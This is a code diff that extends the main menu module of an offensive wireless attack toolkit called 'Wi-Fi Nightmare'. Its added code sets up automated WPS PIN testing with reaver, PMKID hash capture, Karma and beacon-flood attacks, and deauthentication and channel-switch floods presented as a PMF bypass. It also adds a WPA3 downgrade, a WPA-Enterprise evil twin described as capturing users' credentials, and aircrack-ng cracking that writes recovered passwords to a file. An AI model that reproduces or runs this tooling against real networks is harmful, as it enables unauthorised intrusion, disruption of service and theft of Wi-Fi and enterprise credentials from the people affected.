@@ -7,7 +7,14 @@ import re
 import shutil
 import subprocess
 import threading
-from scapy.all import sniff, Dot11, EAPOL
+try:
+    from scapy.all import sniff, Dot11, EAPOL
+    HAS_SCAPY = True
+except ImportError:
+    sniff = None
+    Dot11 = None
+    EAPOL = None
+    HAS_SCAPY = False
 
 # Allow running directly: python3 wifi_nightmare/main.py
 if __name__ == "__main__" and __package__ is None:
@@ -43,6 +50,36 @@ except ImportError:
     PixieDustAttack = None
 
 from wifi_nightmare.capture_native import capture_handshake
+from wifi_nightmare.card_manager import CardManager
+from wifi_nightmare.session_export import SessionExporter
+from wifi_nightmare.wordlist_manager import WordlistManager
+from wifi_nightmare.geo_lookup import GeoLocator
+
+try:
+    from wifi_nightmare.pmkid_attack import PMKIDAttack
+except ImportError:
+    PMKIDAttack = None
+
+try:
+    from wifi_nightmare.karma_attack import KarmaAttack
+except ImportError:
+    KarmaAttack = None
+
+try:
+    from wifi_nightmare.beacon_flood import BeaconFlood
+except ImportError:
+    BeaconFlood = None
+
+try:
+    from wifi_nightmare.radius_fake import WPAEnterpriseEvil
+except ImportError:
+    WPAEnterpriseEvil = None
+
+try:
+    from wifi_nightmare.tui_dashboard import TUIDashboard, HAS_RICH
+except ImportError:
+    TUIDashboard = None
+    HAS_RICH = False
 
 class WifiGTR:
     def __init__(self, interface, serial_port=None):
@@ -50,6 +87,9 @@ class WifiGTR:
         self.interface = interface
         self.serial_port = serial_port
         self.db = DatabaseHandler()
+        self.card_mgr = CardManager()
+        self.sniffer_interface = interface
+        self.injector_interface = interface
         
         utils.check_root()
         utils.check_interface_exists(self.interface)
@@ -58,13 +98,35 @@ class WifiGTR:
         self.display_list = []
         self.esp_driver = None
         self.vif_info = None
+        self.session_exporter = SessionExporter()
+        self.wordlist_mgr = WordlistManager()
+        self.geo_locator = GeoLocator(
+            wigle_api_key=os.environ.get('WIGLE_API_KEY'),
+            wigle_api_name=os.environ.get('WIGLE_API_NAME')
+        )
+        self.tui_dashboard = TUIDashboard(interface=interface) if TUIDashboard else None
         
     def start(self):
         logger.info("Starting Wi-Fi Nightmare")
         
-        # 1. Enable Monitor Mode
+        # 1. Enable Monitor Mode & Auto-Assign Multi-Card Roles
         self.interface = utils.enable_monitor_mode(self.interface)
         utils.run_command(["ip", "link", "set", self.interface, "up"])
+        
+        # Check Multi-Card Aggregation
+        roles = self.card_mgr.auto_assign_roles(preferred_iface=self.interface)
+        if roles.get("mode") == "dual":
+            self.sniffer_interface = roles["sniffer"]
+            self.injector_interface = roles["injector"]
+            # Enable monitor on secondary adapter as well
+            self.injector_interface = utils.enable_monitor_mode(self.injector_interface)
+            utils.run_command(["ip", "link", "set", self.injector_interface, "up"])
+            print(f"{C_GREEN}[+] Multi-Card Aggregation ACTIVE:{C_RESET}")
+            print(f"    - Sniffer (Continuous Capture): {C_CYAN}{self.sniffer_interface}{C_RESET}")
+            print(f"    - Injector (Deauth / CSA / Eviction): {C_YELLOW}{self.injector_interface}{C_RESET}")
+        else:
+            self.sniffer_interface = self.interface
+            self.injector_interface = self.interface
         
         # 2. Connect to ESP32 (if port provided)
         if self.serial_port:
@@ -113,8 +175,6 @@ class WifiGTR:
     def main_loop(self):
         while True:
             try:
-                ui.print_main_menu(self.interface)
-                
                 # Show ESP Status
                 if self.esp_driver and self.esp_driver.is_connected:
                     esp_status = f"{C_GREEN}Connected ({self.serial_port}){C_RESET}"
@@ -125,15 +185,13 @@ class WifiGTR:
                 if self.vif_info and self.vif_info["ready"]:
                     vif_status = f"{C_GREEN}Supported{C_RESET}"
                 elif self.vif_info and self.vif_info["supported"]:
-                    vif_status = f"{C_YELLOW}Partial (missing tools){C_RESET}"
+                    vif_status = f"{C_YELLOW}Partial{C_RESET}"
                 else:
                     vif_status = f"{C_GREY}Not Supported{C_RESET}"
 
-                print(f"    ESP Status : {esp_status}")
-                print(f"    VIF Status : {vif_status}")
-                print("--------------------------------------------------")
+                ui.print_main_menu(self.interface, esp_status, vif_status)
                 
-                choice = input(f"{C_YELLOW}[?]{C_RESET} Select Option: ").strip()
+                choice = ui.menu_input("Select Option: ")
                 
                 if choice == '1':   # Scan
                     self.scan_workflow()
@@ -148,6 +206,16 @@ class WifiGTR:
                     self.run_mass_attack()
                 elif choice == '4': # Database
                     self.database_workflow()
+                elif choice == '5': # Export Session
+                    self.session_exporter.interactive_export(
+                        self.scanner.networks if self.scanner else {},
+                        self.db,
+                        self.interface
+                    )
+                elif choice == '6': # Geo-Location Lookup
+                    self.geo_locator.interactive_lookup(
+                        self.scanner.networks if self.scanner else {}
+                    )
                 elif choice == '0':
                     self.cleanup()
                     sys.exit()
@@ -164,10 +232,79 @@ class WifiGTR:
             input("Press Enter...")
             return
 
-        print(f"\n{C_CYAN}--- PIXIE DUST ATTACK ---{C_RESET}")
+        print(f"\n{C_CYAN}--- WPS ATTACK SUITE ---{C_RESET}")
         print(f"Target  : {C_GREEN}{ssid}{C_RESET}")
         print(f"BSSID   : {utils.mask_bssid(bssid)}")
         print(f"Channel : {C_YELLOW}{channel}{C_RESET}")
+        print("------------------------")
+        print(f"{C_WHITE}[1] Pixie Dust Attack (Offline PRNG Key Recovery){C_RESET}")
+        print(f"{C_WHITE}[2] Push-Button Sniffer (PBC - Instant PSK Capture){C_RESET}")
+        print(f"{C_WHITE}[3] Algorithmic Known-PINs (ComputePIN / D-Link / EasyBox){C_RESET}")
+        
+        wps_choice = input(f"{C_YELLOW}[?]{C_RESET} Select WPS Method [1]: ").strip()
+        
+        if wps_choice == '2':
+            # Push-Button PBC Capture
+            try:
+                from wifi_nightmare.wps_suite import WPSPbcSniffer
+                sniffer = WPSPbcSniffer(self.interface, bssid, channel, ssid)
+                res = sniffer.listen_for_pbc(timeout=120)
+                if res and res.success:
+                    self.db.save(bssid, ssid)
+                    self.db.update_wps_info(bssid, res.pin, res.psk)
+            except Exception as e:
+                print(f"{C_RED}[!] PBC Attack error: {e}{C_RESET}")
+            input(f"\n{C_YELLOW}Press Enter to return...{C_RESET}")
+            return
+        elif wps_choice == '3':
+            # Algorithmic Known PINs
+            try:
+                from wifi_nightmare.wps_suite import KnownPinDatabase
+                pins = KnownPinDatabase.get_suggested_pins(bssid)
+                print(f"\n{C_CYAN}[+] Algorithmic PINs for {utils.mask_bssid(bssid)}:{C_RESET}")
+                for i, p in enumerate(pins, 1):
+                    print(f"    {C_GREEN}{i}. PIN: {p}{C_RESET}")
+
+                if shutil.which("reaver"):
+                    try_test = input(f"\n{C_YELLOW}[?] Automatically test these PINs against target with reaver? (y/n) [y]: {C_RESET}").strip().lower()
+                    if try_test != 'n':
+                        utils.run_command(["ip", "link", "set", self.interface, "up"])
+                        utils.run_command(["iw", "dev", self.interface, "set", "channel", str(channel)])
+                        for pin in pins:
+                            print(f"\n{C_YELLOW}[*] Testing PIN: {pin} on {utils.mask_bssid(bssid)} (Channel {channel})...{C_RESET}")
+                            cmd = ["reaver", "-i", self.interface, "-b", bssid, "-c", str(channel), "-p", pin, "-vv", "-N", "-T", "1"]
+                            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
+                            success = False
+                            psk = ""
+                            try:
+                                while proc.poll() is None:
+                                    line = proc.stdout.readline()
+                                    if not line:
+                                        time.sleep(0.05)
+                                        continue
+                                    l_str = line.strip()
+                                    if "WPA PSK:" in l_str:
+                                        psk = l_str.split("WPA PSK:")[-1].strip().strip("'\"").split()[0]
+                                        success = True
+                                        print(f"\n{C_GREEN}[+] [SUCCESS] Correct PIN Found: {pin} | PSK: {psk}{C_RESET}")
+                                        self.db.save(bssid, ssid)
+                                        self.db.update_wps_info(bssid, pin, psk)
+                                        proc.terminate()
+                                        break
+                                    elif "WPS transaction failed" in l_str or "Pin cracked in" in l_str:
+                                        break
+                            except KeyboardInterrupt:
+                                proc.terminate()
+                                print(f"\n{C_YELLOW}[*] PIN testing aborted by user.{C_RESET}")
+                                break
+                            if success:
+                                break
+                else:
+                    print(f"\n{C_GREY}[i] Install 'reaver' (sudo apt install reaver) to automatically test PINs.{C_RESET}")
+            except Exception as e:
+                print(f"{C_RED}[!] Error calculating PINs: {e}{C_RESET}")
+            input(f"\n{C_YELLOW}Press Enter to return...{C_RESET}")
+            return
 
         try:
             from wifi_nightmare.config import PIXIE_DUST_TIMEOUT
@@ -378,46 +515,26 @@ class WifiGTR:
             # decloaked this hidden network and saved the SSID to the DB.
             ssid_name = self._refresh_ssid_from_db(bssid)
             client_count = len(self.scanner.networks[bssid].get('Clients', []))
-            ui.print_target_menu(ssid_name, bssid, channel, client_count)
-            
-            # Option 6: ESP Evil Twin
-            if self.esp_driver and self.esp_driver.is_connected:
-                print(f"{C_WHITE}[6] Evil Twin (ESP){C_RESET}")
-            else:
-                print(f"{C_GREY}[6] Evil Twin (ESP) — No ESP connected{C_RESET}")
+            ui.print_target_menu(
+                ssid=ssid_name,
+                bssid=bssid,
+                channel=channel,
+                client_count=client_count,
+                crypto=net_info.get('Crypto', 'Unknown'),
+                vendor=net_info.get('Vendor', 'Unknown'),
+                has_esp=bool(self.esp_driver and self.esp_driver.is_connected),
+                vif_ready=bool(self.vif_info and self.vif_info.get("ready")),
+                has_wps=bool(net_info.get('WPS')),
+            )
 
-            # Option 7: Software Evil Twin (VIF)
-            if self.vif_info and self.vif_info["ready"]:
-                print(f"{C_WHITE}[7] Evil Twin (Software — No ESP needed){C_RESET}")
-            elif self.vif_info and self.vif_info["supported"]:
-                print(f"{C_YELLOW}[7] Evil Twin (Software) — Missing tools{C_RESET}")
-            else:
-                print(f"{C_GREY}[7] Evil Twin (Software) — VIF not supported{C_RESET}")
-
-            # Option 8: Pixie Dust (WPS)
-            net_info = self.scanner.networks[bssid]
-            if net_info.get('WPS'):
-                if PixieDustAttack:
-                    print(f"{C_WHITE}[8] Pixie Dust Attack (WPS){C_RESET}")
-                else:
-                    print(f"{C_YELLOW}[8] Pixie Dust — Module not loaded{C_RESET}")
-            else:
-                print(f"{C_GREY}[8] Pixie Dust — WPS not detected{C_RESET}")
-
-            # Option 9: Offline wordlist crack (no external shell needed)
-            print(f"{C_WHITE}[9] Crack Handshake (aircrack-ng + Wordlist){C_RESET}")
-
-            print(f"{C_CYAN}-{'-'*24}{C_RESET}")
-            print(f"{C_WHITE}[0] Back to Scan{C_RESET}")
-
-            action = input(f"{C_YELLOW}[?]{C_RESET} Select Action: ").strip()
+            action = ui.menu_input("Select Action: ")
 
             if action == '1': # Handshake
                 self.run_attack((bssid, channel), mode="handshake")
             elif action == '2': # Reveal
                 self.run_attack((bssid, channel), mode="reveal")
-            elif action == '3': # Deauth
-                self.run_attack((bssid, channel), mode="deauth_only")
+            elif action == '3': # Multi-Vector Eviction (PMF Bypass)
+                self.run_multivector_eviction(bssid, channel, ssid_name)
             elif action == '4': # Passive
                 self.run_attack((bssid, channel), mode="passive")
             elif action == '5': # Gen Hash
@@ -452,11 +569,98 @@ class WifiGTR:
                     self.run_pixie_dust_workflow(bssid, channel, ssid_name)
             elif action == '9': # Crack with aircrack-ng
                 self.run_aircrack_crack(bssid, ssid_name)
+            elif action == '10': # WPA3 Downgrade Attack
+                self.run_wpa3_downgrade(bssid, channel, ssid_name)
+            elif action == '11': # PMKID Attack
+                self.run_pmkid_attack(bssid, channel, ssid_name)
+            elif action == '12': # Karma Attack
+                self.run_karma_attack(bssid, channel, ssid_name)
+            elif action == '13': # Beacon Flood
+                self.run_beacon_flood(bssid, channel, ssid_name)
+            elif action == '14': # WPA Enterprise Evil Twin
+                self.run_wpa_enterprise(bssid, channel, ssid_name)
+            elif action == '15': # Smart Crack
+                self.run_smart_crack(bssid, ssid_name)
             elif action == '0':
                 break
             else:
                 print(f"\n{C_RED}[!] Invalid option.{C_RESET}")
                 time.sleep(1)
+
+    def run_multivector_eviction(self, bssid, channel, ssid):
+        """Run intelligent multi-vector eviction (Deauth + CSA + BTM) to bypass PMF."""
+        print(f"\n{C_CYAN}--- MULTI-VECTOR EVICTION (PMF BYPASS SUITE) ---{C_RESET}")
+        print(f"Target   : {C_GREEN}{ssid}{C_RESET}")
+        print(f"BSSID    : {utils.mask_bssid(bssid)}")
+        print(f"Channel  : {C_YELLOW}{channel}{C_RESET}")
+        print("------------------------------------------------")
+        print(f"{C_WHITE}[1] Intelligent Hybrid (Deauth + CSA + BTM) [Default]{C_RESET}")
+        print(f"{C_WHITE}[2] PMF Stealth Only (CSA + 802.11v BTM - No Deauth){C_RESET}")
+        print(f"{C_WHITE}[3] Standard Deauth Burst Flood{C_RESET}")
+        choice = input(f"{C_YELLOW}[?]{C_RESET} Mode [1]: ").strip() or '1'
+
+        utils.run_command(["ip", "link", "set", self.interface, "up"])
+        utils.run_command(["iw", "dev", self.interface, "set", "channel", str(channel)])
+        if self.injector_interface != self.interface:
+            utils.run_command(["iw", "dev", self.injector_interface, "set", "channel", str(channel)])
+
+        try:
+            from wifi_nightmare.eviction import AdvancedEviction
+            engine = AdvancedEviction(self.injector_interface, bssid, channel, ssid)
+        except Exception as e:
+            print(f"{C_RED}[!] Could not load eviction engine: {e}{C_RESET}")
+            return
+
+        pmf_mode = (choice == '2')
+        deauth_only = (choice == '3')
+
+        print(f"\n{C_GREEN}[*] Eviction Active on {utils.mask_bssid(bssid)} (Channel {channel}) | Ctrl+C to Stop...{C_RESET}")
+        total_packets = 0
+        start = time.time()
+
+        with utils.SignalManager() as sig:
+            while not sig.stopped:
+                try:
+                    if deauth_only:
+                        sent = engine.send_deauth_burst(count=5)
+                    elif pmf_mode:
+                        sent = engine.send_csa_burst(count=4)
+                    else:
+                        sent = engine.evict_client(client_mac=None, pmf_active=False)
+                    total_packets += sent
+                    elapsed = time.time() - start
+                    sys.stdout.write(f"\r{C_YELLOW}[+] Eviction frames injected: {total_packets} | {elapsed:.1f}s active{C_RESET}   ")
+                    sys.stdout.flush()
+                    time.sleep(0.3)
+                except Exception as e:
+                    logger.debug(f"Eviction loop error: {e}")
+                    time.sleep(1)
+
+        input(f"\n\n{C_YELLOW}Press Enter to return to menu...{C_RESET}")
+
+    def run_wpa3_downgrade(self, bssid, channel, ssid):
+        """WPA3/SAE Transition Mode Downgrade Attack.
+        
+        Clones target AP beacons with WPA2-PSK only while injecting Channel Switch
+        Announcements (CSA) on the original AP. Forces clients supporting both WPA3/WPA2
+        to downgrade and complete a standard 4-way handshake (crackable M2).
+        """
+        print(f"\n{C_CYAN}--- WPA3/SAE TRANSITION DOWNGRADE ATTACK ---{C_RESET}")
+        print(f"Target   : {C_GREEN}{ssid}{C_RESET}")
+        print(f"BSSID    : {utils.mask_bssid(bssid)}")
+        print(f"Channel  : {C_YELLOW}{channel}{C_RESET}")
+        print(f"{C_YELLOW}[i] Injecting CSA frames to evict clients from WPA3 (PMF-protected)...{C_RESET}")
+        
+        try:
+            from wifi_nightmare.eviction import AdvancedEviction
+            eviction = AdvancedEviction(self.injector_interface, bssid, channel, ssid)
+            # Continuous CSA eviction burst
+            eviction.send_csa_burst(count=6)
+        except Exception as e:
+            logger.debug(f"CSA trigger failed: {e}")
+
+        # Start handshake capture immediately
+        self.run_attack((bssid, channel), mode="handshake")
 
     def run_eviltwin_workflow(self, bssid, channel, ssid):
         if not self.esp_driver or not self.esp_driver.is_connected:
@@ -541,7 +745,11 @@ class WifiGTR:
                         continue
 
                     if time.time() - last_print > 0.5:
-                        self.display_list = ui.print_scan_table(self.interface, self.scanner.networks, self.scanner.lock)
+                        if self.tui_dashboard and HAS_RICH:
+                            self.tui_dashboard.update(self.scanner.networks, self.scanner.lock)
+                            self.display_list = self.tui_dashboard.render_rich()
+                        else:
+                            self.display_list = ui.print_scan_table(self.interface, self.scanner.networks, self.scanner.lock)
                         last_print = time.time()
             except KeyboardInterrupt:
                 self.scanner.stop_sniffing = True
@@ -664,11 +872,12 @@ class WifiGTR:
                 pass
 
             result = capture_handshake(
-                interface=self.interface,
+                interface=self.sniffer_interface,
                 bssid=bssid,
                 channel=channel,
                 timeout=timeout,
-                ssid=current_ssid
+                ssid=current_ssid,
+                injector_interface=self.injector_interface
             )
 
             if result:
@@ -684,7 +893,7 @@ class WifiGTR:
             return
 
         attacker = NetworkAttacker(
-            interface=self.interface, 
+            interface=self.injector_interface, 
             target_bssid=bssid, 
             target_channel=channel, 
             db_handler=self.db, 
@@ -835,7 +1044,7 @@ class WifiGTR:
     def database_workflow(self):
         while True:
             ui.print_database_menu()
-            op = input(f"{C_YELLOW}[?]{C_RESET} Select Action: ").strip()
+            op = ui.menu_input("Select Action: ")
             if op == '1':
                 ui.show_saved_db(self.db)
                 input("Press Enter...")
@@ -992,7 +1201,7 @@ class WifiGTR:
 
             ui.print_portal_menu(template_names, status, has_esp)
 
-            choice = input(f"{C_YELLOW}[?]{C_RESET} Select Action: ").strip()
+            choice = ui.menu_input("Select Action: ")
 
             if choice == '0':
                 break
@@ -1064,6 +1273,236 @@ class WifiGTR:
             else:
                 print(f"{C_RED}[!] Invalid option{C_RESET}")
                 time.sleep(0.5)
+
+    def run_pmkid_attack(self, bssid: str, channel: int, ssid: str):
+        """Run PMKID attack (clientless WPA2 hash harvesting)."""
+        if PMKIDAttack is None:
+            print(f"{C_RED}[!] PMKID module not available.{C_RESET}")
+            input("Press Enter...")
+            return
+        try:
+            from wifi_nightmare.config import config as cfg
+            timeout = cfg.get('attacks', {}).get('pmkid_timeout', 60)
+        except Exception:
+            timeout = 60
+
+        utils.run_command(["ip", "link", "set", self.interface, "up"])
+        utils.run_command(["iw", "dev", self.interface, "set", "channel", str(channel)])
+        if self.sniffer_interface != self.interface:
+            utils.run_command(["iw", "dev", self.sniffer_interface, "set", "channel", str(channel)])
+
+        attacker = PMKIDAttack(
+            interface=self.sniffer_interface,
+            bssid=bssid,
+            channel=channel,
+            ssid=ssid,
+            timeout=timeout
+        )
+
+        with utils.SignalManager() as sig:
+            def _pmkid_thread():
+                attacker.run()
+            t = threading.Thread(target=_pmkid_thread, daemon=True)
+            t.start()
+            while t.is_alive():
+                if sig.stopped:
+                    attacker.stop()
+                    break
+                t.join(timeout=0.5)
+
+        if attacker.results:
+            result = attacker.results[0]
+            self.db.save(bssid, ssid)
+            self.db.update_handshake(bssid, True, utils.get_current_time_12h(),
+                                     filename=result.hc22000_line[:100])
+            print(f"\n{C_GREEN}[+] PMKID saved! Crack with: hashcat -m 22000 <file> <wordlist>{C_RESET}")
+        input(f"\n{C_YELLOW}Press Enter to return...{C_RESET}")
+
+    def run_karma_attack(self, bssid: str, channel: int, ssid: str):
+        """Run Karma Attack — respond to all Probe Requests."""
+        if KarmaAttack is None:
+            print(f"{C_RED}[!] Karma module not available.{C_RESET}")
+            input("Press Enter...")
+            return
+
+        print(f"\n{C_CYAN}--- KARMA ATTACK ---{C_RESET}")
+        print(f"{C_WHITE}[1] Target SSID only (respond only to probes for '{ssid}'){C_RESET}")
+        print(f"{C_WHITE}[2] Respond ALL (full Karma — respond to any probe){C_RESET}")
+        mode_choice = input(f"{C_YELLOW}[?]{C_RESET} Mode [1]: ").strip() or '1'
+
+        target_ssids = [ssid] if mode_choice != '2' else None
+        respond_all = (mode_choice == '2')
+
+        utils.run_command(["ip", "link", "set", self.interface, "up"])
+        utils.run_command(["iw", "dev", self.interface, "set", "channel", str(channel)])
+        if self.injector_interface != self.interface:
+            utils.run_command(["iw", "dev", self.injector_interface, "set", "channel", str(channel)])
+
+        karma = KarmaAttack(
+            interface=self.injector_interface,
+            target_ssids=target_ssids,
+            channel=channel,
+            respond_all=respond_all
+        )
+        with utils.SignalManager() as sig:
+            def _karma_thread():
+                karma.run()
+            t = threading.Thread(target=_karma_thread, daemon=True)
+            t.start()
+            while t.is_alive():
+                if sig.stopped:
+                    karma.stop()
+                    break
+                t.join(timeout=0.5)
+
+        input(f"\n{C_YELLOW}Press Enter to return...{C_RESET}")
+
+    def run_beacon_flood(self, bssid: str, channel: int, ssid: str):
+        """Run Beacon Flood attack."""
+        if BeaconFlood is None:
+            print(f"{C_RED}[!] BeaconFlood module not available.{C_RESET}")
+            input("Press Enter...")
+            return
+
+        print(f"\n{C_CYAN}--- BEACON FLOOD ---{C_RESET}")
+        print(f"{C_WHITE}[1] Clone SSID (flood with '{ssid}' clones){C_RESET}")
+        print(f"{C_WHITE}[2] Common SSIDs (flood with popular network names){C_RESET}")
+        print(f"{C_WHITE}[3] Random SSIDs{C_RESET}")
+        flood_choice = input(f"{C_YELLOW}[?]{C_RESET} Mode [1]: ").strip() or '1'
+
+        modes = {'1': 'clone', '2': 'common', '3': 'random'}
+        mode = modes.get(flood_choice, 'clone')
+
+        utils.run_command(["ip", "link", "set", self.interface, "up"])
+        utils.run_command(["iw", "dev", self.interface, "set", "channel", str(channel)])
+        if self.injector_interface != self.interface:
+            utils.run_command(["iw", "dev", self.injector_interface, "set", "channel", str(channel)])
+
+        flooder = BeaconFlood(
+            interface=self.injector_interface,
+            mode=mode,
+            ssid=ssid,
+            channel=channel
+        )
+        with utils.SignalManager() as sig:
+            def _flood_thread():
+                flooder.run()
+            t = threading.Thread(target=_flood_thread, daemon=True)
+            t.start()
+            while t.is_alive():
+                if sig.stopped:
+                    flooder.stop()
+                    break
+                t.join(timeout=0.5)
+
+        input(f"\n{C_YELLOW}Press Enter to return...{C_RESET}")
+
+    def run_wpa_enterprise(self, bssid: str, channel: int, ssid: str):
+        """Run WPA-Enterprise Evil Twin for credential harvesting."""
+        if WPAEnterpriseEvil is None:
+            print(f"{C_RED}[!] WPA-Enterprise module not available.{C_RESET}")
+            input("Press Enter...")
+            return
+
+        print(f"\n{C_CYAN}--- WPA-ENTERPRISE EVIL TWIN ---{C_RESET}")
+        print(f"{C_YELLOW}[!] This will clone '{ssid}' as a WPA-Enterprise AP{C_RESET}")
+        print(f"{C_YELLOW}[!] Any user entering enterprise credentials will be captured{C_RESET}")
+        confirm = input(f"{C_YELLOW}[?] Start attack? (y/n): {C_RESET}").strip().lower()
+        if confirm != 'y':
+            return
+
+        attack = WPAEnterpriseEvil(
+            interface=self.original_interface,
+            ssid=ssid,
+            channel=channel,
+            bssid=bssid
+        )
+        with utils.SignalManager() as sig:
+            def _ent_thread():
+                attack.run()
+            t = threading.Thread(target=_ent_thread, daemon=True)
+            t.start()
+            while t.is_alive():
+                if sig.stopped:
+                    attack.stop()
+                    break
+                t.join(timeout=0.5)
+
+        input(f"\n{C_YELLOW}Press Enter to return...{C_RESET}")
+
+    def run_smart_crack(self, bssid: str, ssid: str):
+        """Run Smart Wordlist crack (SSID-smart + rockyou)."""
+        info = self.db.get_info(bssid)
+        if not (info and info.get('HSFile') and os.path.exists(info['HSFile'])):
+            print(f"{C_RED}[!] No handshake for this target. Capture one first (Option 1).{C_RESET}")
+            input("\nPress Enter...")
+            return
+
+        if not shutil.which('aircrack-ng'):
+            print(f"{C_RED}[!] aircrack-ng not found.{C_RESET}")
+            input("\nPress Enter...")
+            return
+
+        wordlist_path = self.wordlist_mgr.interactive_select(ssid, bssid)
+        if not wordlist_path:
+            return
+
+        self.run_aircrack_crack_with_wordlist(bssid, ssid, wordlist_path)
+
+    def run_aircrack_crack_with_wordlist(self, bssid: str, ssid: str, wordlist: str):
+        """Run aircrack-ng with a given wordlist path."""
+        info = self.db.get_info(bssid)
+        if not info:
+            return
+        pcap = info.get('HSFile', '')
+        if not pcap or not os.path.exists(pcap):
+            print(f"{C_RED}[!] Handshake file not found.{C_RESET}")
+            return
+        if not os.path.isfile(wordlist):
+            print(f"{C_RED}[!] Wordlist not found: {wordlist}{C_RESET}")
+            return
+
+        cmd = ['aircrack-ng', '-a', '2', '-b', bssid, '-w', wordlist, pcap]
+        print(f"\n{C_YELLOW}[*] Running: aircrack-ng with smart wordlist (Ctrl+C to stop){C_RESET}\n")
+        password = None
+        proc = None
+        try:
+            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE,
+                                    stderr=subprocess.STDOUT, stdin=subprocess.DEVNULL)
+            buf = b''
+            while True:
+                chunk = proc.stdout.read(4096)
+                if not chunk:
+                    break
+                sys.stdout.write(chunk.decode(errors='replace'))
+                sys.stdout.flush()
+                buf += chunk
+                while b'\n' in buf:
+                    line, buf = buf.split(b'\n', 1)
+                    if b'KEY FOUND!' in line:
+                        m = re.search(r'KEY FOUND!\s*\[\s*([^\]\r\n]+?)\s*\]', line.decode(errors='replace'))
+                        if m:
+                            password = m.group(1).strip()
+            proc.wait()
+        except KeyboardInterrupt:
+            if proc:
+                try:
+                    proc.kill()
+                except Exception:
+                    pass
+                proc.wait()
+        except Exception as e:
+            print(f"{C_RED}[!] Error: {e}{C_RESET}")
+
+        if password:
+            print(f"\n{C_GREEN}[+] PASSWORD FOUND: {C_WHITE}{password}{C_RESET}")
+            ts = time.strftime('%Y-%m-%d %H:%M:%S')
+            with open('cracked.txt', 'a') as f:
+                f.write(f"[{ts}] SSID: {ssid} | MAC: {utils.mask_bssid(bssid)} | Password: {password}\n")
+            print(f"{C_GREEN}    Saved to cracked.txt{C_RESET}")
+        else:
+            print(f"\n{C_YELLOW}[-] Password not found in wordlist.{C_RESET}")
+        input("\nPress Enter...")
 
 
 def entry_point():
